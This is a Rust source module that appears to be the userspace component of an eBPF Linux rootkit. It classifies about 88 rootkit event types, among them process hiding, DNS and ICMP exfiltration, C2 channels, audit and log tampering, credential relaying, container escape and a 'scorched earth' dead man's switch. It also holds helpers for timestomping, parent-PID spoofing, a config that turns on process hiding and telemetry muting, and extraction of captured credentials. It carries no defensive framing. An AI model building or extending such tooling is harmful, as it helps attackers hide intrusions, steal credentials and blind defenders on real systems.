pub mod error;
pub use error::OffenseError;

use common::{
    CredentialCapture, EventHeader, RootkitConfig, TimestompEntry, EVENT_ANCESTRY_SPOOFED,
    EVENT_ANTI_DETACH, EVENT_BPF_CLOAKED, EVENT_BYTECODE_WIPED, EVENT_C2_AUTH_FAILED,
    EVENT_CONTAINER_PROBE, EVENT_CRED_RELAYED, EVENT_DNS_EXFIL, EVENT_FILE_OBFUSCATED,
    EVENT_ICMP_EXFIL, EVENT_KALLSYMS_HIDDEN, EVENT_LOG_TAMPERED, EVENT_MEMFD_STAGED,
    EVENT_MODULE_MASQUERADE, EVENT_NETNS_HIDDEN, EVENT_PACKET_INTERCEPTED, EVENT_PROC_HIDDEN,
    EVENT_SOCKET_CLONED, EVENT_SYSLOG_STRIPPED, EVENT_TELEMETRY_MUTED, EVENT_TIMESTOMPED,
    // Kernel evasion events (25-28)
    EVENT_KPROBE_DETECTED, EVENT_TAIL_CALL_CHAIN, EVENT_FTRACE_BLINDED, EVENT_BPF_ITER_ABUSED,
    // Memory & process events (29-32)
    EVENT_VDSO_HOOKED, EVENT_SHM_COVERT_MSG, EVENT_UFFD_INJECTION, EVENT_COREDUMP_SUPPRESSED,
    // Network covert events (33-37)
    EVENT_ISN_COVERT, EVENT_IPV6_EXT_ABUSE, EVENT_ARP_POISONED, EVENT_PORT_KNOCK_AUTH,
    EVENT_BGP_HIJACK,
    // Hardware events (38-40)
    EVENT_DR_BREAKPOINT, EVENT_PMC_COVERT, EVENT_TSC_SIDECHAN,
    // Anti-forensics events (41-44)
    EVENT_AUDIT_KILLED, EVENT_INODE_SLACK_HIDE, EVENT_JOURNAL_MANIPULATED, EVENT_PROC_DEEP_SPOOF,
    // Advanced persistence events (45-47)
    EVENT_INITRAMFS_IMPLANT, EVENT_MODSIGN_BYPASS, EVENT_BPF_LINK_PINNED,
    // Hypervisor evasion events (48-51)
    EVENT_HYPERVISOR_DETECTED, EVENT_HYPERVISOR_FINGERPRINT, EVENT_HYPERVISOR_BLINDSPOT,
    EVENT_LIVE_MIGRATION_DETECTED,
    // Polymorphic/self-replication events (52-54)
    EVENT_BYTECODE_MORPHED, EVENT_PATTERN_ROTATED, EVENT_OPAQUE_PREDICATE,
    // Phantom network stack events (55-57)
    EVENT_PHANTOM_SYN_ACK, EVENT_PHANTOM_CONN_ESTABLISHED, EVENT_PHANTOM_DATA_XFER,
    // Cross-container lateral movement events (58-60)
    EVENT_CGROUP_BPF_INJECT, EVENT_CONTAINER_LATERAL, EVENT_NAMESPACE_ESCAPE,
    // DMA covert channel events (61-63)
    EVENT_DMA_STASH, EVENT_PCIE_TLP_SIGNAL, EVENT_NIC_EXFIL,
    // Behavioral AI camouflage events (64-66)
    EVENT_BEHAVIOR_PROFILED, EVENT_ACTIVITY_THROTTLED, EVENT_NORM_DEVIATION_AVOIDED,
    // Supply chain persistence events (67-69)
    EVENT_PKG_MANAGER_HOOKED, EVENT_BINARY_PATCHED_INFLIGHT, EVENT_INTEGRITY_BYPASSED,
    // Dead man's switch events (70-72)
    EVENT_HEARTBEAT_RECEIVED, EVENT_DEADMAN_ARMED, EVENT_SCORCHED_EARTH,
    // BPF parasitism events (73-75)
    EVENT_BPF_PROG_DETECTED, EVENT_TAILCALL_INJECTED, EVENT_PROG_ARRAY_HIJACKED,
    // Advanced rootkit technique events (76-80)
    EVENT_TASK_STRUCT_PATCHED, EVENT_LSM_HOOK_SUBVERTED, EVENT_IDT_HOOKED,
    EVENT_FTRACE_SELF_HIDDEN, EVENT_LIVEPATCH_ABUSED,
    // Network stealth layer events (81-84)
    EVENT_RAW_SOCKET_C2, EVENT_TC_TRAFFIC_INJECTED, EVENT_DOH_C2_ESTABLISHED,
    EVENT_TRAFFIC_SHAPED,
    // Advanced persistence events category 4 (85-88)
    EVENT_OBFUSCATED_PIN, EVENT_CGROUP_PERSIST, EVENT_MODULE_PARAM_INJECT,
    EVENT_INITRAMFS_LOADER,
};

#[derive(Debug, Clone, PartialEq)]
pub enum EventClassification {
    // Original events (1-24)
    ProcessHidden { pid: u32 },
    PacketIntercepted { cmd_type: u32, arg: u64 },
    FileObfuscated { pid: u32, inode: u64 },
    LogTampered { pid: u32, bytes: u64 },
    AncestrySpoofed { pid: u32, fake_ppid: u64 },
    DnsExfil { seq: u64 },
    KallsymsHidden { pid: u32, inode: u64 },
    AntiDetach { pid: u32, cmd: u64 },
    Timestomped { pid: u32, inode: u64 },
    C2AuthFailed { encrypted: u64 },
    TelemetryMuted { pid: u32 },
    NetnsHidden { pid: u32, netns_ino: u64 },
    BpfCloaked { pid: u32, prog_id: u64 },
    ModuleMasquerade { pid: u32, inode: u64 },
    MemfdStaged { pid: u32, fd: u64 },
    SyslogStripped { pid: u32, bytes: u64 },
    BytecodeWiped { pid: u32 },
    IcmpExfil { seq: u64 },
    SocketCloned { pid: u32, cookie: u64 },
    CredRelayed { pid: u32, bytes: u64 },
    ContainerProbe { pid: u32, ns_ino: u64 },
    // Kernel evasion (25-28)
    KprobeDetected { pid: u32, addr: u64 },
    TailCallChain { pid: u32, depth: u64 },
    FtraceBlinded { pid: u32, target: u64 },
    BpfIterAbused { pid: u32, iter_id: u64 },
    // Memory & process (29-32)
    VdsoHooked { pid: u32, offset: u64 },
    ShmCovertMsg { pid: u32, shm_id: u64 },
    UffdInjection { pid: u32, addr: u64 },
    CoredumpSuppressed { pid: u32, signal: u64 },
    // Network covert (33-37)
    IsnCovert { pid: u32, seq_num: u64 },
    Ipv6ExtAbuse { pid: u32, ext_type: u64 },
    ArpPoisoned { pid: u32, target_ip: u64 },
    PortKnockAuth { pid: u32, port_seq: u64 },
    BgpHijack { pid: u32, prefix: u64 },
    // Hardware (38-40)
    DrBreakpoint { pid: u32, dr_index: u64 },
    PmcCovert { pid: u32, counter_id: u64 },
    TscSidechan { pid: u32, delta: u64 },
    // Anti-forensics (41-44)
    AuditKilled { pid: u32, audit_pid: u64 },
    InodeSlackHide { pid: u32, inode: u64 },
    JournalManipulated { pid: u32, offset: u64 },
    ProcDeepSpoof { pid: u32, field_id: u64 },
    // Advanced persistence (45-47)
    InitramfsImplant { pid: u32, size: u64 },
    ModsignBypass { pid: u32, module_hash: u64 },
    BpfLinkPinned { pid: u32, link_id: u64 },
    // Hypervisor evasion (48-51)
    HypervisorDetected { pid: u32, hv_type: u64 },
    HypervisorFingerprint { pid: u32, signature: u64 },
    HypervisorBlindspot { pid: u32, gap_ns: u64 },
    LiveMigrationDetected { pid: u32, tsc_delta: u64 },
    // Polymorphic/self-replication (52-54)
    BytecodeMorphed { pid: u32, gen_id: u64 },
    PatternRotated { pid: u32, pattern_hash: u64 },
    OpaquePredicate { pid: u32, predicate_id: u64 },
    // Phantom network stack (55-57)
    PhantomSynAck { pid: u32, port: u64 },
    PhantomConnEstablished { pid: u32, conn_id: u64 },
    PhantomDataXfer { pid: u32, bytes: u64 },
    // Cross-container lateral movement (58-60)
    CgroupBpfInject { pid: u32, cgroup_id: u64 },
    ContainerLateral { pid: u32, target_ns: u64 },
    NamespaceEscape { pid: u32, ns_ino: u64 },
    // DMA covert channel (61-63)
    DmaStash { pid: u32, dma_addr: u64 },
    PcieTlpSignal { pid: u32, device_id: u64 },
    NicExfil { pid: u32, bytes: u64 },
    // Behavioral AI camouflage (64-66)
    BehaviorProfiled { pid: u32, profile_id: u64 },
    ActivityThrottled { pid: u32, rate: u64 },
    NormDeviationAvoided { pid: u32, margin: u64 },
    // Supply chain persistence (67-69)
    PkgManagerHooked { pid: u32, pkg_hash: u64 },
    BinaryPatchedInflight { pid: u32, inode: u64 },
    IntegrityBypassed { pid: u32, check_id: u64 },
    // Dead man's switch (70-72)
    HeartbeatReceived { pid: u32, interval: u64 },
    DeadmanArmed { pid: u32, timeout: u64 },
    ScorchedEarth { pid: u32, targets: u64 },
    // BPF parasitism (73-75)
    BpfProgDetected { pid: u32, prog_id: u64 },
    TailcallInjected { pid: u32, map_id: u64 },
    ProgArrayHijacked { pid: u32, index: u64 },
    // Advanced rootkit techniques (76-80)
    TaskStructPatched { pid: u32, field_offset: u64 },
    LsmHookSubverted { pid: u32, hook_id: u64 },
    IdtHooked { pid: u32, vector: u64 },
    FtraceSelfHidden { pid: u32, prog_id: u64 },
    LivepatchAbused { pid: u32, target_addr: u64 },
    // Network stealth layer (81-84)
    RawSocketC2 { pid: u32, port: u64 },
    TcTrafficInjected { pid: u32, bytes: u64 },
    DohC2Established { pid: u32, domain_hash: u64 },
    TrafficShaped { pid: u32, rate_limit: u64 },
    // Advanced persistence category 4 (85-88)
    ObfuscatedPin { pid: u32, path_hash: u64 },
    CgroupPersist { pid: u32, cgroup_id: u64 },
    ModuleParamInject { pid: u32, module_hash: u64 },
    InitramfsLoader { pid: u32, loader_size: u64 },
    // Unknown
    Unknown { event_type: u32 },
}

pub fn classify_event(event: &EventHeader) -> EventClassification {
    match event.event_type {
        EVENT_PROC_HIDDEN => EventClassification::ProcessHidden { pid: event.pid },
        EVENT_PACKET_INTERCEPTED => EventClassification::PacketIntercepted {
            cmd_type: event.pid,
            arg: event.context,
        },
        EVENT_FILE_OBFUSCATED => EventClassification::FileObfuscated {
            pid: event.pid,
            inode: event.context,
        },
        EVENT_LOG_TAMPERED => EventClassification::LogTampered {
            pid: event.pid,
            bytes: event.context,
        },
        EVENT_ANCESTRY_SPOOFED => EventClassification::AncestrySpoofed {
            pid: event.pid,
            fake_ppid: event.context,
        },
        EVENT_DNS_EXFIL => EventClassification::DnsExfil { seq: event.context },
        EVENT_KALLSYMS_HIDDEN => EventClassification::KallsymsHidden {
            pid: event.pid,
            inode: event.context,
        },
        EVENT_ANTI_DETACH => EventClassification::AntiDetach {
            pid: event.pid,
            cmd: event.context,
        },
        EVENT_TIMESTOMPED => EventClassification::Timestomped {
            pid: event.pid,
            inode: event.context,
        },
        EVENT_C2_AUTH_FAILED => EventClassification::C2AuthFailed {
            encrypted: event.context,
        },
        EVENT_TELEMETRY_MUTED => EventClassification::TelemetryMuted { pid: event.pid },
        EVENT_NETNS_HIDDEN => EventClassification::NetnsHidden {
            pid: event.pid,
            netns_ino: event.context,
        },
        EVENT_BPF_CLOAKED => EventClassification::BpfCloaked {
            pid: event.pid,
            prog_id: event.context,
        },
        EVENT_MODULE_MASQUERADE => EventClassification::ModuleMasquerade {
            pid: event.pid,
            inode: event.context,
        },
        EVENT_MEMFD_STAGED => EventClassification::MemfdStaged {
            pid: event.pid,
            fd: event.context,
        },
        EVENT_SYSLOG_STRIPPED => EventClassification::SyslogStripped {
            pid: event.pid,
            bytes: event.context,
        },
        EVENT_BYTECODE_WIPED => EventClassification::BytecodeWiped { pid: event.pid },
        EVENT_ICMP_EXFIL => EventClassification::IcmpExfil { seq: event.context },
        EVENT_SOCKET_CLONED => EventClassification::SocketCloned {
            pid: event.pid,
            cookie: event.context,
        },
        EVENT_CRED_RELAYED => EventClassification::CredRelayed {
            pid: event.pid,
            bytes: event.context,
        },
        EVENT_CONTAINER_PROBE => EventClassification::ContainerProbe {
            pid: event.pid,
            ns_ino: event.context,
        },
        // Kernel evasion (25-28)
        EVENT_KPROBE_DETECTED => EventClassification::KprobeDetected {
            pid: event.pid,
            addr: event.context,
        },
        EVENT_TAIL_CALL_CHAIN => EventClassification::TailCallChain {
            pid: event.pid,
            depth: event.context,
        },
        EVENT_FTRACE_BLINDED => EventClassification::FtraceBlinded {
            pid: event.pid,
            target: event.context,
        },
        EVENT_BPF_ITER_ABUSED => EventClassification::BpfIterAbused {
            pid: event.pid,
            iter_id: event.context,
        },
        // Memory & process (29-32)
        EVENT_VDSO_HOOKED => EventClassification::VdsoHooked {
            pid: event.pid,
            offset: event.context,
        },
        EVENT_SHM_COVERT_MSG => EventClassification::ShmCovertMsg {
            pid: event.pid,
            shm_id: event.context,
        },
        EVENT_UFFD_INJECTION => EventClassification::UffdInjection {
            pid: event.pid,
            addr: event.context,
        },
        EVENT_COREDUMP_SUPPRESSED => EventClassification::CoredumpSuppressed {
            pid: event.pid,
            signal: event.context,
        },
        // Network covert (33-37)
        EVENT_ISN_COVERT => EventClassification::IsnCovert {
            pid: event.pid,
            seq_num: event.context,
        },
        EVENT_IPV6_EXT_ABUSE => EventClassification::Ipv6ExtAbuse {
            pid: event.pid,
            ext_type: event.context,
        },
        EVENT_ARP_POISONED => EventClassification::ArpPoisoned {
            pid: event.pid,
            target_ip: event.context,
        },
        EVENT_PORT_KNOCK_AUTH => EventClassification::PortKnockAuth {
            pid: event.pid,
            port_seq: event.context,
        },
        EVENT_BGP_HIJACK => EventClassification::BgpHijack {
            pid: event.pid,
            prefix: event.context,
        },
        // Hardware (38-40)
        EVENT_DR_BREAKPOINT => EventClassification::DrBreakpoint {
            pid: event.pid,
            dr_index: event.context,
        },
        EVENT_PMC_COVERT => EventClassification::PmcCovert {
            pid: event.pid,
            counter_id: event.context,
        },
        EVENT_TSC_SIDECHAN => EventClassification::TscSidechan {
            pid: event.pid,
            delta: event.context,
        },
        // Anti-forensics (41-44)
        EVENT_AUDIT_KILLED => EventClassification::AuditKilled {
            pid: event.pid,
            audit_pid: event.context,
        },
        EVENT_INODE_SLACK_HIDE => EventClassification::InodeSlackHide {
            pid: event.pid,
            inode: event.context,
        },
        EVENT_JOURNAL_MANIPULATED => EventClassification::JournalManipulated {
            pid: event.pid,
            offset: event.context,
        },
        EVENT_PROC_DEEP_SPOOF => EventClassification::ProcDeepSpoof {
            pid: event.pid,
            field_id: event.context,
        },
        // Advanced persistence (45-47)
        EVENT_INITRAMFS_IMPLANT => EventClassification::InitramfsImplant {
            pid: event.pid,
            size: event.context,
        },
        EVENT_MODSIGN_BYPASS => EventClassification::ModsignBypass {
            pid: event.pid,
            module_hash: event.context,
        },
        EVENT_BPF_LINK_PINNED => EventClassification::BpfLinkPinned {
            pid: event.pid,
            link_id: event.context,
        },
        // Hypervisor evasion (48-51)
        EVENT_HYPERVISOR_DETECTED => EventClassification::HypervisorDetected {
            pid: event.pid,
            hv_type: event.context,
        },
        EVENT_HYPERVISOR_FINGERPRINT => EventClassification::HypervisorFingerprint {
            pid: event.pid,
            signature: event.context,
        },
        EVENT_HYPERVISOR_BLINDSPOT => EventClassification::HypervisorBlindspot {
            pid: event.pid,
            gap_ns: event.context,
        },
        EVENT_LIVE_MIGRATION_DETECTED => EventClassification::LiveMigrationDetected {
            pid: event.pid,
            tsc_delta: event.context,
        },
        // Polymorphic/self-replication (52-54)
        EVENT_BYTECODE_MORPHED => EventClassification::BytecodeMorphed {
            pid: event.pid,
            gen_id: event.context,
        },
        EVENT_PATTERN_ROTATED => EventClassification::PatternRotated {
            pid: event.pid,
            pattern_hash: event.context,
        },
        EVENT_OPAQUE_PREDICATE => EventClassification::OpaquePredicate {
            pid: event.pid,
            predicate_id: event.context,
        },
        // Phantom network stack (55-57)
        EVENT_PHANTOM_SYN_ACK => EventClassification::PhantomSynAck {
            pid: event.pid,
            port: event.context,
        },
        EVENT_PHANTOM_CONN_ESTABLISHED => EventClassification::PhantomConnEstablished {
            pid: event.pid,
            conn_id: event.context,
        },
        EVENT_PHANTOM_DATA_XFER => EventClassification::PhantomDataXfer {
            pid: event.pid,
            bytes: event.context,
        },
        // Cross-container lateral movement (58-60)
        EVENT_CGROUP_BPF_INJECT => EventClassification::CgroupBpfInject {
            pid: event.pid,
            cgroup_id: event.context,
        },
        EVENT_CONTAINER_LATERAL => EventClassification::ContainerLateral {
            pid: event.pid,
            target_ns: event.context,
        },
        EVENT_NAMESPACE_ESCAPE => EventClassification::NamespaceEscape {
            pid: event.pid,
            ns_ino: event.context,
        },
        // DMA covert channel (61-63)
        EVENT_DMA_STASH => EventClassification::DmaStash {
            pid: event.pid,
            dma_addr: event.context,
        },
        EVENT_PCIE_TLP_SIGNAL => EventClassification::PcieTlpSignal {
            pid: event.pid,
            device_id: event.context,
        },
        EVENT_NIC_EXFIL => EventClassification::NicExfil {
            pid: event.pid,
            bytes: event.context,
        },
        // Behavioral AI camouflage (64-66)
        EVENT_BEHAVIOR_PROFILED => EventClassification::BehaviorProfiled {
            pid: event.pid,
            profile_id: event.context,
        },
        EVENT_ACTIVITY_THROTTLED => EventClassification::ActivityThrottled {
            pid: event.pid,
            rate: event.context,
        },
        EVENT_NORM_DEVIATION_AVOIDED => EventClassification::NormDeviationAvoided {
            pid: event.pid,
            margin: event.context,
        },
        // Supply chain persistence (67-69)
        EVENT_PKG_MANAGER_HOOKED => EventClassification::PkgManagerHooked {
            pid: event.pid,
            pkg_hash: event.context,
        },
        EVENT_BINARY_PATCHED_INFLIGHT => EventClassification::BinaryPatchedInflight {
            pid: event.pid,
            inode: event.context,
        },
        EVENT_INTEGRITY_BYPASSED => EventClassification::IntegrityBypassed {
            pid: event.pid,
            check_id: event.context,
        },
        // Dead man's switch (70-72)
        EVENT_HEARTBEAT_RECEIVED => EventClassification::HeartbeatReceived {
            pid: event.pid,
            interval: event.context,
        },
        EVENT_DEADMAN_ARMED => EventClassification::DeadmanArmed {
            pid: event.pid,
            timeout: event.context,
        },
        EVENT_SCORCHED_EARTH => EventClassification::ScorchedEarth {
            pid: event.pid,
            targets: event.context,
        },
        // BPF parasitism (73-75)
        EVENT_BPF_PROG_DETECTED => EventClassification::BpfProgDetected {
            pid: event.pid,
            prog_id: event.context,
        },
        EVENT_TAILCALL_INJECTED => EventClassification::TailcallInjected {
            pid: event.pid,
            map_id: event.context,
        },
        EVENT_PROG_ARRAY_HIJACKED => EventClassification::ProgArrayHijacked {
            pid: event.pid,
            index: event.context,
        },
        // Advanced rootkit techniques (76-80)
        EVENT_TASK_STRUCT_PATCHED => EventClassification::TaskStructPatched {
            pid: event.pid,
            field_offset: event.context,
        },
        EVENT_LSM_HOOK_SUBVERTED => EventClassification::LsmHookSubverted {
            pid: event.pid,
            hook_id: event.context,
        },
        EVENT_IDT_HOOKED => EventClassification::IdtHooked {
            pid: event.pid,
            vector: event.context,
        },
        EVENT_FTRACE_SELF_HIDDEN => EventClassification::FtraceSelfHidden {
            pid: event.pid,
            prog_id: event.context,
        },
        EVENT_LIVEPATCH_ABUSED => EventClassification::LivepatchAbused {
            pid: event.pid,
            target_addr: event.context,
        },
        // Network stealth layer (81-84)
        EVENT_RAW_SOCKET_C2 => EventClassification::RawSocketC2 {
            pid: event.pid,
            port: event.context,
        },
        EVENT_TC_TRAFFIC_INJECTED => EventClassification::TcTrafficInjected {
            pid: event.pid,
            bytes: event.context,
        },
        EVENT_DOH_C2_ESTABLISHED => EventClassification::DohC2Established {
            pid: event.pid,
            domain_hash: event.context,
        },
        EVENT_TRAFFIC_SHAPED => EventClassification::TrafficShaped {
            pid: event.pid,
            rate_limit: event.context,
        },
        // Advanced persistence category 4 (85-88)
        EVENT_OBFUSCATED_PIN => EventClassification::ObfuscatedPin {
            pid: event.pid,
            path_hash: event.context,
        },
        EVENT_CGROUP_PERSIST => EventClassification::CgroupPersist {
            pid: event.pid,
            cgroup_id: event.context,
        },
        EVENT_MODULE_PARAM_INJECT => EventClassification::ModuleParamInject {
            pid: event.pid,
            module_hash: event.context,
        },
        EVENT_INITRAMFS_LOADER => EventClassification::InitramfsLoader {
            pid: event.pid,
            loader_size: event.context,
        },
        _ => EventClassification::Unknown {
            event_type: event.event_type,
        },
    }
}

pub fn parse_tty_device(s: &str) -> Option<(u32, u32)> {
    let parts: Vec<&str> = s.split(':').collect();
    if parts.len() != 2 {
        return None;
    }
    let major = parts[0].parse::<u32>().ok()?;
    let minor = parts[1].parse::<u32>().ok()?;
    Some((major, minor))
}

pub fn parse_spoof_ppid(s: &str) -> Option<(u32, u32)> {
    let parts: Vec<&str> = s.split(':').collect();
    if parts.len() != 2 {
        return None;
    }
    let pid = parts[0].parse::<u32>().ok()?;
    let fake_ppid = parts[1].parse::<u32>().ok()?;
    Some((pid, fake_ppid))
}

pub fn parse_timestomp(s: &str) -> Option<(u64, TimestompEntry)> {
    let parts: Vec<&str> = s.split(':').collect();
    if parts.len() != 4 {
        return None;
    }
    let inode = parts[0].parse::<u64>().ok()?;
    let atime = parts[1].parse::<u64>().ok()?;
    let mtime = parts[2].parse::<u64>().ok()?;
    let ctime = parts[3].parse::<u64>().ok()?;

    Some((
        inode,
        TimestompEntry {
            fake_mtime_sec: mtime,
            fake_atime_sec: atime,
            fake_ctime_sec: ctime,
        },
    ))
}

pub fn make_rootkit_config(self_pid: u32) -> RootkitConfig {
    RootkitConfig {
        self_pid,
        hide_procs: 1,
        net_stealth: 1,
        file_obfuscate: 1,
        mute_telemetry: 1,
        _pad: [0u8; 4],
    }
}

pub fn tty_dev_key(major: u32, minor: u32) -> u64 {
    ((major as u64) << 32) | (minor as u64)
}

pub fn credential_data(capture: &CredentialCapture) -> &[u8] {
    &capture.data[..capture.data_len as usize]
}
